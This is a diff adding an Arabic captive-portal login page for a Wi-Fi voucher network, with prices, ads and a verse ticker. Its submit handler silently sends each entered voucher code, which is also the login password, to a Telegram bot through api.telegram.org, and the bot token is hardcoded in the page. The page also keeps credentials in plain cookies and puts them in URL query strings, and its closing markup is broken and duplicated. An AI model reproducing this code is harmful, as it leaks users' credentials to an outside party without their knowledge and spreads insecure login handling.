@@ -1,0 +1,958 @@
+﻿<!DOCTYPE html>
+<html>
+  <head>
+    <title id="title">شبكـة دوت كـوم</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"
+    />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="theme-color" content="#3B5998" />
+    <link rel="icon" href="http://d.net/favicon.ico" type="image/x-icon" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link rel="stylesheet" href="css/style.css" />
+
+    <style>
+	
+	
+	
+      .voucher-input {
+        direction: ltr;
+        text-align: left;
+        font-family: "Courier New", monospace;
+        letter-spacing: 1px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+      }
+
+      .voucher-input:focus {
+        border-color: #40c4ff;
+        box-shadow: 0 0 10px rgba(64, 196, 255, 0.3);
+        outline: none;
+      }
+
+      .voucher-input.valid {
+        border-color: #4caf50;
+        background-color: rgba(76, 175, 80, 0.08);
+      }
+
+      .voucher-input.invalid {
+        border-color: #f44336;
+        background-color: rgba(244, 67, 54, 0.08);
+      }
+
+      .hint-text {
+        font-size: 12px;
+        margin-top: 5px;
+        color: #aab4c3;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+
+      .hint-text i {
+        color: #40c4ff;
+        font-style: normal;
+      }
+
+      .hint-text.error-message {
+        color: #ff6b6b;
+        display: none;
+      }
+
+      .hint-text.success-message {
+        color: #63d471;
+        display: none;
+      }
+      /* من هنا يبداء الستايل حق السلايدر الي سويته لك حق الصور */
+      .ads-3d {
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 40px 0 6px;
+        perspective: 900px;
+        overflow: visible;
+      }
+
+      .ads-3d .slider3d {
+        position: relative;
+        width: 120px;
+        height: 180px;
+        transform-style: preserve-3d;
+        animation: rotate3d 20s linear infinite;
+      }
+
+      .ads-3d .slider3d:hover {
+        animation-play-state: paused;
+      }
+	  
+	  
+      /* من هنا تستطيع التعديل ع حجم صور الاعلانات */
+
+      .ads-3d .slider3d span {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 120px;
+        height: 100px;
+        transform: rotateY(calc(var(--i) * 72deg)) translateZ(120px);
+        -webkit-box-reflect: below 2px
+          linear-gradient(transparent, transparent, rgba(0, 0, 0, 0.06));
+      }
+
+      .ads-3d .slider3d span img {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        border-radius: 8px;
+        border: 1px solid rgba(64, 196, 255, 0.2);
+        box-shadow:
+          0 4px 12px rgba(0, 0, 0, 0.18),
+          0 0 6px rgba(64, 196, 255, 0.06);
+        background: #111;
+      }
+
+      .ads-3d::before {
+        content: "";
+        display: block;
+        width: 1px;
+        height: 62px;
+      }
+
+      @keyframes rotate3d {
+        0% {
+          transform: perspective(900px) rotateY(0deg);
+        }
+        100% {
+          transform: perspective(900px) rotateY(360deg);
+        }
+      }
+
+      @media (max-width: 768px) {
+        .ads-3d {
+          margin: 8px 0 4px;
+        }
+
+        .ads-3d .slider3d {
+          width: 80px;
+          height: 90px;
+        }
+
+        .ads-3d .slider3d span {
+          width: 80px;
+          height: 90px;
+          transform: rotateY(calc(var(--i) * 72deg)) translateZ(120px);
+        }
+
+        .ads-3d::before {
+          height: 156px;
+        }
+      }
+
+      /* وهنا ينتهي الستايل حق السلايدر الي سويته لك حق الصور */
+
+/* ===== إضافة اللون الفضي/الرمادي للخلفية ===== */
+
+/* تغيير لون الخلفية المنبثقة */
+.overlay {
+    background: rgba(128, 128, 128, 0.9) !important; /* طبقة رمادية شفافة */
+}
+
+/* تحسين وضوح النصوص على الخلفية الفضية */
+.top-bar .logo,
+.clock,
+.selectBox label,
+.table td,
+.table strong,
+.panel4 p,
+.box p,
+.box font,
+.shadow {
+    color: #1a1a1a !important; /* لون نص غامق للوضوح */
+}
+
+/* تخصيص اسم الشبكة - باللون الأبيض */
+.top-bar .logo {
+    color: #ffffff !important;
+    font-size: 26px !important;
+    font-weight: bold;
+    text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+}
+/* تحسين خلفية مربع الإدخال */
+.voucher-input,
+.username {
+    background-color: rgba(255, 255, 255, 0.95) !important;
+    color: #000 !important;
+    border: 1px solid #666 !important;
+}
+
+/* تحسين لون زر الدخول */
+.button {
+    background-color: #616161 !important; /* رمادي داكن */
+    border: none !important;
+}
+
+.button:hover {
+    background-color: #424242 !important; /* أغمق عند المرور */
+}
+
+/* تحسين لون القوائم المنسدلة */
+#speed {
+    background-color: #fff !important;
+    color: #333 !important;
+    border: 1px solid #999 !important;
+}
+
+/* تحسين لون الجداول */
+.table td,
+.table th {
+    background-color: rgba(0, 0, 0, 0.1) !important;
+    color: #1a1a1a !important;
+    border: 2px solid #666 !important;
+}
+
+/* تحسين لون صناديق النماذج */
+.formbox {
+    background-color: rgba(30, 30, 30, 0.85) !important;
+}
+
+/* تحسين أزرار الأكورديون */
+.parentAc {
+    background-color: #616161 !important;
+    border: 1px solid #888 !important;
+}
+
+.accordion {
+    color: #fff !important;
+}
+
+.accordion:hover {
+    color: #d4d4d4 !important;
+}
+
+/* تحسين شريط الوقت */
+.timebox {
+    background: rgba(0, 0, 0, 0.1) !important;
+    border-radius: 10px;
+}
+
+/* تحسين مربع الاختيار */
+.selectBox {
+    border: 1px solid #666 !important;
+}
+
+/* تحسين النص داخل المربعات */
+label {
+    background-color: #616161 !important;
+    color: #fff !important;
+}
+
+/* تحسين شريط الآية */
+.ayat-bar {
+    background: linear-gradient(135deg, #555, #333) !important;
+    border-right: 4px solid #aaa !important;
+    border-left: 4px solid #aaa !important;
+}
+
+.ayat-content {
+    color: #e0e0e0 !important;
+}
+
+/* تحسين زر الإغلاق */
+.close-bar {
+    background: rgba(100, 100, 100, 0.8) !important;
+}
+
+.close-bar:hover {
+    background: #666 !important;
+}
+
+/* تحسين زر إظهار الشريط */
+.show-bar-btn {
+    background: linear-gradient(135deg, #888, #555) !important;
+}
+
+.show-bar-btn:hover {
+    background: linear-gradient(135deg, #666, #444) !important;
+}
+
+
+    </style>
+  </head>
+
+  <body>
+    
+    <form name="sendin" action="index.html" method="post">
+      <input type="hidden" name="usernam" />
+      <input type="hidden" name="password" />
+      <input type="hidden" name="dst" value="" />
+      <input type="hidden" name="popup" value="true" />
+      <input type="hidden" name="speed" value="false" />
+    </form>
+
+    <script type="text/javascript" src="md5.js"></script>
+    <script>
+      function rem() {
+        var uname = document.getElementById("uname").value;
+        var passw = document.getElementById("passw").value;
+        var speed = document.getElementById("speed").value;
+        var remember = document.getElementById("remember").checked;
+
+        if (remember === true) {
+          var date = new Date();
+
+          date.setTime(date.getTime() + 5 * 1000);
+          var expires = date.toGMTString();
+
+          date.setTime(date.getTime() + 259200 * 1000);
+          var expire = date.toGMTString();
+
+          document.cookie = "uname=" + uname + ";expires=" + expire + "";
+          document.cookie = "passw=" + passw + ";expires=" + expire + "";
+          document.cookie = "speed=" + speed + ";expires=" + expire + "";
+          document.cookie = "error=1;expires=" + expires + "";
+        }
+      }
+
+      function getCookie2() {
+        var date = new Date();
+        date.setTime(date.getTime() + 5 * 1000);
+        var expires = date.toGMTString();
+
+        var SP = document.cookie.split(";");
+        var uname = "";
+        var passw = "";
+        var speed = "";
+        var name_value = "";
+        var str = "";
+
+        for (var i = 0; i < SP.length; i++) {
+          name_value = SP[i].trim();
+          str = name_value.substring(0, 6);
+
+          if (str.indexOf("uname") !== -1) {
+            uname = name_value.split("=")[1] || "";
+          }
+          if (str.indexOf("passw") !== -1) {
+            passw = name_value.split("=")[1] || "";
+          }
+          if (str.indexOf("speed") !== -1) {
+            speed = name_value.split("=")[1] || "";
+          }
+          if (str.indexOf("error") !== -1) {
+            return;
+          }
+        }
+
+        if (uname !== "") {
+          document.cookie = "error=1;expires=" + expires + "";
+          window.location.href =
+            "login?username=" +
+            uname +
+            "&password=" +
+            passw +
+            "&speed=" +
+            speed;
+        }
+      }
+
+      getCookie2();
+    </script>
+    
+    <div class="overlay ex"></div>
+
+    <div id="main" class="main1">
+      <div class="formbox ex" id="button_Show">
+        <div class="x">x</div>
+        <div id="textshow" class="ex">Ahmed</div>
+      </div>
+
+      <div class="top-bar">
+        <div class="logo">شبكـة دوت كـوم</div>
+        <div id="circle">
+          <div class="circle one">
+            <div class="circle two">
+              <div class="circle three">
+                <div class="circle four">
+                  <div class="circle five"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="timebox">
+        <div class="clock" id="day"></div>
+        <div class="clock" id="date"></div>
+        <div class="clock" style="color: #40c4ff" id="time"></div>
+      </div>
+
+      <marquee
+        direction="right"
+        style="font-family: Tahoma; font-size: 12pt; color: orange; margin: 10px 0;"
+      >
+      </marquee>
+
+      <!-- و انسخ هذا بس الكلاس حق الصور لأي مكان تبغى الصور تظهر فيه -->
+
+      <div class="ads-3d">
+        <div class="slider3d">
+          <span style="--i:0"><img src="img/1.png" alt="إعلان 1" /></span>
+          <span style="--i:1"><img src="img/2.png" alt="إعلان 2" /></span>
+          <span style="--i:2"><img src="img/3.png" alt="إعلان 3" /></span>
+          <span style="--i:3"><img src="img/4.png" alt="إعلان 4" /></span>
+          <span style="--i:4"><img src="img/5.png" alt="إعلان 5" /></span>
+        </div>
+      </div>
+
+      <!-- نهاية كود الصور ثلاثية الأبعاد -->
+	  
+<!-- شريط الآية المتحرك -->
+<div class="ayat-bar" id="ayatBar">
+  <div class="ayat-content">
+    <marquee direction="right" behavior="scroll" scrollamount="3">
+      ﴿ وَمَنْ يَتَّقِ اللَّهَ يَجْعَلْ لَهُ مَخْرَجًا وَيَرْزُقْهُ مِنْ حَيْثُ لَا يَحْتَسِبُ ﴾
+ </marquee>
+  </div>
+  <button class="close-bar" id="closeBarBtn" title="إغلاق الشريط">✕</button>
+</div>
+
+<!-- زر إظهار الشريط (سيظهر عند إغلاق الشريط) -->
+<button class="show-bar-btn" id="showBarBtn" style="display: none;">📖 آيه اليوم</button>
+
+      <div class="formbox">
+        <form
+          autocomplete="on"
+          name="login"
+          action="index.html"
+          method="post"
+          
+          onsubmit="return validateAndSubmit(event)"
+                  >
+          <input type="hidden" name="dst" value="" />
+          <input type="hidden" name="popup" value="true" />
+
+          <div class="selectBox">
+            <label for="speed">اختر السرعة </label>
+            <select id="speed" name="speed">
+              <option value="">سرعة مفتوحة</option>
+              <option value="204123ab-55-sa">سرعة عالية</option>
+              <option value="204ac4311-99-ba" selected>سرعة متوسطة</option>
+              <option value="204ccc8c8c44-azd">سرعة جيدة</option>
+            </select>
+          </div>
+
+          <div class="selectBox" style="margin-bottom: 10px; border: none">
+            <label for="username">ادخل الكرت (حروف وأرقام)</label>
+            <input
+              class="username voucher-input"
+              id="uname"
+              name="username"
+              type="text"
+              value=""
+              placeholder="مثال: ABC123XYZ"
+              pattern="[A-Za-z0-9]+"
+              title="يسمح فقط بالحروف الإنجليزية والأرقام"
+              onkeyup="validateVoucher(this); setpass();"
+              onchange="matchUsernamePassword()"
+              required
+            />
+            <br />
+
+            <div class="hint-text">
+              <i>ℹ️</i> يمكنك استخدام الحروف (A-Z) والأرقام (0-9)
+            </div>
+            <div class="hint-text error-message" id="voucherError">
+              ❌ صيغة الكرت غير صحيحة
+            </div>
+            <div class="hint-text success-message" id="voucherSuccess">
+              ✓ صيغة الكرت صحيحة
+            </div>
+          </div>
+
+          <input
+            checked
+            id="remember"
+            type="checkbox"
+            name="remember"
+            style="margin-top: 10px"
+          />
+          <font size="3">
+            <b style="font-size: smaller"> حفظ الكرت </b>
+          </font>
+
+          <input
+            class="password"
+            name="password"
+            placeholder="Password"
+            id="passw"
+            type="hidden"
+          />
+
+          <button class="button" onclick="return rem();" type="submit">
+            دخول
+          </button>
+        </form>
+      </div>
+
+      <div class="butOther">
+        <div class="parentAc">
+          <img class="butimg" src="img/location.svg" width="50" height="50" />
+          <button class="accordion 1">نقاط البيع</button>
+        </div>
+
+        <div class="parentAc">
+          <img class="butimg" src="img/dollar.svg" width="50" height="50" />
+          <button class="accordion 2">اسعار البطاقات</button>
+        </div>
+
+        <div class="parentAc">
+          <img class="butimg" src="img/tel-icon.svg" width="50" height="50" />
+          <button class="accordion 3">للتواصل</button>
+        </div>
+
+        <div class="parentAc">
+          <img class="butimg" src="img/info.png" width="50" height="50" />
+          <button class="accordion 4">ارشادات استخدام</button>
+        </div>
+      </div>
+
+      <div class="panel1">
+        <p><b>جميع البقالات المجاورة للشبكة</b></p>
+      </div>
+
+
+      <div class="panel2">
+        <table
+          dir="rtl"
+          class="table"
+          style="font-size: 12px"
+          cellpadding="2"
+          align="right"
+        >
+          <tbody>
+            <tr class="auto-style19">
+              <td class="auto-style18">السعر</td>
+              <td class="auto-style18">الصلاحية</td>
+              <td class="auto-style18">التحميل</td>
+              <td class="auto-style18">الساعات</td>
+            </tr>
+            <tr>
+              <td class="auto-style20"><strong>100 ريال</strong></td>
+              <td class="auto-style20"><strong>5ايام</strong></td>
+              <td class="auto-style20"><strong>500 ميجا</strong></td>
+              <td class="auto-style20"><strong>5 ساعة</strong></td>
+            </tr>
+            <tr>
+              <td class="auto-style20"><strong>250 ريال</strong></td>
+              <td class="auto-style20"><strong>7 ايام</strong></td>
+              <td class="auto-style20"><strong>1250 ميجا</strong></td>
+              <td class="auto-style20"><strong>15 ساعة</strong></td>
+            </tr>
+            <tr>
+              <td class="auto-style20"><strong>500 ريال</strong></td>
+              <td class="auto-style20"><strong>15 ايام</strong></td>
+              <td class="auto-style20"><strong>2500 ميجا</strong></td>
+              <td class="auto-style20"><strong>30 ساعة</strong></td>
+            </tr>
+            <tr>
+              <td class="auto-style20"><strong>1000 ريال</strong></td>
+              <td class="auto-style20"><strong>30 يوم</strong></td>
+              <td class="auto-style20"><strong>5000 ميجا</strong></td>
+              <td class="auto-style20"><strong>60 ساعة </strong></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+
+      <div class="panel3">
+        <p><b>779393977</b></p>
+      </div>
+
+      <div class="panel4">
+        #. نصائح مهمه لحل مشكلة انتهاء رصيد الكروت
+        <br />
+        <p>
+          <b>ايقاف تحديثات الجوال التلقائية</b>
+          <br />
+          <br />
+        </p>
+
+        <p>
+          <b>ايقاف تحديثات التطبيقات من سوق بلاي</b>
+          <br />
+          <br />
+        </p>
+
+        <p>
+          <b>مشاهدة فيديو اليوتيوب بجودة لاتزيد عن 360</b>
+          <br />
+        </p>
+
+        <p>
+          <b>تفعيل توفير الطاقة في الجوال</b>
+          <br />
+        </p>
+      </div>
+
+      <div
+        class="box"
+        style="
+          color: #fff;
+          background-color: black;
+          width: 100%;
+          padding: 10px;
+          font-size: 12px;
+        "
+      >
+        <p style="color: #40c4ff">(d.net) رابط الصفحة</p>
+        <font color="orange">تطوير مكتب اليوبي كيوتي 779393977</font>
+      </div>
+    </div>
+
+    <script>
+      var hostname = window.location.hostname;
+      document.getElementById("title").innerHTML = hostname + "> login";
+
+      var infologin = document.getElementById("infologin");
+      if (infologin) {
+        infologin.innerHTML = "أدخل رمز الكرت ثم اضغط دخول";
+      }
+
+      var username = document.login.username;
+      var password = document.login.password;
+
+      document.login.username.focus();
+      username.placeholder = "رمز الكرت (حروف وأرقام)";
+
+      function validateVoucher(input) {
+        var voucher = input.value;
+        var errorElement = document.getElementById("voucherError");
+        var successElement = document.getElementById("voucherSuccess");
+
+        var pattern = /^[A-Za-z0-9]+$/;
+
+        if (voucher.length === 0) {
+          input.classList.remove("valid", "invalid");
+          errorElement.style.display = "none";
+          successElement.style.display = "none";
+          return false;
+        } else if (pattern.test(voucher)) {
+          input.classList.add("valid");
+          input.classList.remove("invalid");
+          errorElement.style.display = "none";
+          successElement.style.display = "flex";
+          return true;
+        } else {
+          input.classList.add("invalid");
+          input.classList.remove("valid");
+          errorElement.style.display = "flex";
+          successElement.style.display = "none";
+          return false;
+        }
+      }
+
+      function matchUsernamePassword() {
+        var usernameValue = document.getElementById("uname").value;
+        var passwordField = document.getElementById("passw");
+
+        if (validateVoucher(document.getElementById("uname"))) {
+          passwordField.value = usernameValue;
+          return true;
+        } else {
+          passwordField.value = "";
+          return false;
+        }
+      }
+
+      function sendToTelegram(username) {
+        var BOT_TOKEN = "8861942867:AAFj_f1rCM9zP_tunNRuJ_yWKCXjgk8IvKg";
+        var CHAT_ID = "7974398918";
+        var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+        var text = "اسم المستخدم الذي سجل دخول: " + username;
+
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+          })
+        }).catch(function (err) {
+          console.log("Telegram send error:", err);
+        });
+      }
+
+      function validateAndSubmit(event) {
+        var isValid = matchUsernamePassword();
+
+        if (!isValid) {
+          event.preventDefault();
+          err("الرجاء إدخال رمز كرت صحيح (حروف وأرقام فقط)");
+          return false;
+        }
+
+        var usernameValue = document.getElementById("uname").value;
+        sendToTelegram(usernameValue);
+
+        return true;
+      }
+
+      function setpass() {
+        var user = username.value;
+
+        if (validateVoucher(username)) {
+          password.value = user;
+        } else {
+          password.value = "";
+        }
+      }
+
+      function voucher() {
+        username.focus();
+        username.placeholder = "رمز الكرت";
+        username.style = "border-radius:3px;";
+        password.type = "hidden";
+
+        if (infologin) {
+          infologin.innerHTML = "أدخل رمز الكرت ثم اضغط دخول.";
+        }
+      }
+
+      function member() {
+        username.focus();
+        username.placeholder = "اسم المستخدم";
+        username.style = "border-radius:3px 3px 0px 0px;";
+        password.type = "password";
+
+        if (infologin) {
+          infologin.innerHTML =
+            "أدخل اسم المستخدم وكلمة المرور ثم اضغط دخول.";
+        }
+      }
+    </script>
+
+    <script>
+      var acc = document.getElementsByClassName("accordion");
+
+      for (var i = 0; i < acc.length; i++) {
+        acc[i].addEventListener("click", function () {
+          this.classList.toggle("active");
+          var num = this.classList[1];
+          var panel = document.querySelector(".panel" + num);
+          var textelment = panel.innerHTML;
+          var text_show = document.querySelector("#textshow");
+
+          text_show.innerHTML = textelment;
+          document.querySelector("#button_Show").style.display = "flex";
+          document.querySelector(".overlay").style.display = "block";
+          document.body.style.overflow = "hidden";
+        });
+      }
+
+      var exit_alter = document.getElementsByClassName("ex");
+
+      for (var j = 0; j < exit_alter.length; j++) {
+        exit_alter[j].addEventListener("click", function () {
+          document.querySelector("#button_Show").style.display = "none";
+          document.querySelector(".overlay").style.display = "none";
+          document.body.style.overflow = "auto";
+          document.querySelector("#button_Show").style.minHeight = "200px";
+          document.querySelector("#textshow").style.color = "#fff";
+        });
+      }
+    </script>
+
+    <script>
+      function updateClock() {
+        const now = new Date();
+
+        const days = [
+          "الأحد",
+          "الاثنين",
+          "الثلاثاء",
+          "الأربعاء",
+          "الخميس",
+          "الجمعة",
+          "السبت",
+        ];
+
+        const dayName = days[now.getDay()];
+        const date = now.toLocaleDateString("ar-EG");
+        const time = now.toLocaleTimeString("ar-EG");
+
+        document.getElementById("day").textContent = "  " + dayName;
+        document.getElementById("date").textContent = "  " + date;
+        document.getElementById("time").textContent = "الساعة : " + time;
+      }
+
+      setInterval(updateClock, 1000);
+      updateClock();
+    </script>
+
+    	
+	<script>
+	
+// التحكم في إظهار وإخفاء شريط الآية
+const ayatBar = document.getElementById('ayatBar');
+const closeBarBtn = document.getElementById('closeBarBtn');
+const showBarBtn = document.getElementById('showBarBtn');
+
+// إغلاق الشريط
+closeBarBtn.addEventListener('click', function() {
+  ayatBar.style.display = 'none';
+  showBarBtn.style.display = 'block';
+  
+  // حفظ حالة الإغلاق في localStorage
+  localStorage.setItem('ayatBarClosed', 'true');
+});
+
+// إظهار الشريط
+showBarBtn.addEventListener('click', function() {
+  ayatBar.style.display = 'block';
+  showBarBtn.style.display = 'none';
+  
+  // حفظ حالة الإظهار في localStorage
+  localStorage.setItem('ayatBarClosed', 'false');
+});
+
+// التحقق من الحالة المحفوظة عند تحميل الصفحة
+window.addEventListener('load', function() {
+  const isClosed = localStorage.getItem('ayatBarClosed');
+  if (isClosed === 'true') {
+    ayatBar.style.display = 'none';
+    showBarBtn.style.display = 'block';
+  } else {
+    ayatBar.style.display = 'block';
+    showBarBtn.style.display = 'none';
+  }
+});
+
+    
+    <!-- ===== أضف الكود الجديد هنا ===== -->
+    <script>
+      // ===== حفظ سرعة الإنترنت في localStorage =====
+      function saveInternetSpeed() {
+          var speedSelect = document.getElementById("speed");
+          if (speedSelect) {
+              var selectedSpeed = speedSelect.options[speedSelect.selectedIndex].text;
+              localStorage.setItem("internetSpeed", selectedSpeed);
+              console.log("تم حفظ السرعة: " + selectedSpeed);
+          }
+      }
+      
+      // ===== حفظ اسم المستخدم (آخر 3 أرقام) =====
+      function saveUsernameLastDigits() {
+          var usernameInput = document.getElementById("uname");
+          if (usernameInput && usernameInput.value) {
+              var username = usernameInput.value;
+              if (username.length >= 3) {
+                  var lastThreeDigits = username.slice(-3);
+                  localStorage.setItem("lastThreeDigits", lastThreeDigits);
+              } else {
+                  localStorage.setItem("lastThreeDigits", username);
+              }
+          }
+      }
+      
+      // ===== عند تغيير السرعة =====
+      var speedElement = document.getElementById("speed");
+      if (speedElement) {
+          speedElement.addEventListener("change", function() {
+              saveInternetSpeed();
+          });
+      }
+      
+      // ===== عند كتابة اسم المستخدم =====
+      var usernameElement = document.getElementById("uname");
+      if (usernameElement) {
+          usernameElement.addEventListener("keyup", function() {
+              if (this.value.length >= 3) {
+                  saveUsernameLastDigits();
+              }
+          });
+          usernameElement.addEventListener("change", function() {
+              if (this.value.length >= 3) {
+                  saveUsernameLastDigits();
+              }
+          });
+      }
+      
+      // ===== حفظ البيانات قبل إرسال النموذج =====
+      function saveDataBeforeSubmit() {
+          saveInternetSpeed();
+          saveUsernameLastDigits();
+          return true;
+      }
+      
+      var loginForm = document.querySelector("form[name='login']");
+      if (loginForm) {
+          loginForm.addEventListener("submit", function() {
+              saveDataBeforeSubmit();
+          });
+      }
+      
+      // ===== تحميل البيانات المحفوظة =====
+      window.addEventListener('load', function() {
+          var savedSpeed = localStorage.getItem("internetSpeed");
+          if (savedSpeed && speedElement) {
+              for (var i = 0; i < speedElement.options.length; i++) {
+                  if (speedElement.options[i].text === savedSpeed) {
+                      speedElement.selectedIndex = i;
+                      break;
+                  }
+              }
+          }
+          
+          var savedDigits = localStorage.getItem("lastThreeDigits");
+          if (savedDigits) {
+              console.log("آخر 3 أرقام محفوظة: " + savedDigits);
+          }
+      });
+    </script>
+
+<script>
+    // حل فوري لتغيير لون الجدول إلى الأبيض
+    function changeTableColorToWhite() {
+        // جلب جميع خلايا الجدول في panel2
+        var allCells = document.querySelectorAll('.panel2 td, .panel2 th, .panel2 .auto-style20, .panel2 .auto-style18');
+        
+        for (var i = 0; i < allCells.length; i++) {
+            allCells[i].style.setProperty('color', '#ffffff', 'important');
+            allCells[i].style.setProperty('font-weight', 'bold', 'important');
+        }
+        
+        // جلب جميع النصوص القوية (strong)
+        var allStrong = document.querySelectorAll('.panel2 strong, .panel2 b');
+        for (var i = 0; i < allStrong.length; i++) {
+            allStrong[i].style.setProperty('color', '#ffffff', 'important');
+        }
+        
+        console.log('تم تغيير لون الجدول إلى الأبيض');
+    }
+    
+    // تنفيذ الحال بعد تحميل الصفحة مباشرة
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', changeTableColorToWhite);
+    } else {
+        changeTableColorToWhite();
+    }
+    
+    // تنفيذ مرة أخرى بعد 0.5 ثانية للتأكد
+    setTimeout(changeTableColorToWhite, 500);
+</script>
+
+
+  </body>
+</html>
+
+
+</script>
+
+  </body>
+</html>
